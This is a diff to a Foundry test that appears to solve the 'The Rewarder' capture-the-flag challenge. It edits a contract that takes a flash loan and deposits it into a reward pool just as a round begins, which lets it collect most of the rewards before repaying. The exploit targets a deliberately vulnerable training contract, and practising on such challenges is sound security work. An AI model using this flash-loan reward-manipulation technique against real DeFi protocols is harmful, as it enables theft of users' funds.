@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 contract TheRewarderAttacker {
     FlashLoanerPool public flashLoanerPool;
@@ -34,14 +35,14 @@ contract TheRewarderAttacker {
         uint256 max = dvt.balanceOf(address(flashLoanerPool)); // 1m ether of dvt
         dvt.approve(address(theRewarderPool), max);
         flashLoanerPool.flashLoan(max);
+        RewardToken rewardToken = theRewarderPool.rewardToken();
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
     }
 
     function receiveFlashLoan(uint256 amount) external {
         console2.log("receive flash loan entered");
         console2.log("amount is;", amount);
         theRewarderPool.deposit(amount);
-        // accountingToken.approve(address(this), amount);
-        // accountingToken.approve(address(theRewarderPool), amount);
         theRewarderPool.withdraw(amount);
         dvt.transfer(address(flashLoanerPool), amount);
     }
@@ -126,15 +127,11 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
+        vm.warp(block.timestamp + 5 days);
         AccountingToken accToken = theRewarderPool.accToken();
         TheRewarderAttacker attackerContract = new TheRewarderAttacker(flashLoanerPool, dvt, theRewarderPool, accToken);
         attackerContract.attack();
-
-        vm.warp(block.timestamp + 5 days);
-        theRewarderPool.distributeRewards();
         vm.stopPrank();
-
-        //CLUE IS THAT A ROUND HAS TAKEN PLACE WOT
         /**
          * EXPLOIT END *
          */
@@ -150,17 +147,19 @@ contract TheRewarder is Test {
             theRewarderPool.distributeRewards();
             uint256 rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
             uint256 delta = rewardPerUser - 25e18;
-            assertLt(delta, 1e16);
+            assertLt(delta, 1e16, "assert1");
         }
         // Rewards must have been issued to the attacker account
-        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
+        assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18, "assert2");
         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
 
         // The amount of rewards earned should be really close to 100 tokens
         uint256 deltaAttacker = 100e18 - rewardAttacker;
-        assertLt(deltaAttacker, 1e17);
+        console2.log("rewardAttacker:", rewardAttacker / 1e18);
+        console2.log("deltaAttacker:", deltaAttacker / 1e18);
+        assertLt(deltaAttacker, 1e17, "assert3");
 
         // Attacker finishes with zero DVT tokens in balance
-        assertEq(dvt.balanceOf(attacker), 0);
+        assertEq(dvt.balanceOf(attacker), 0, "assert4");
     }
 }
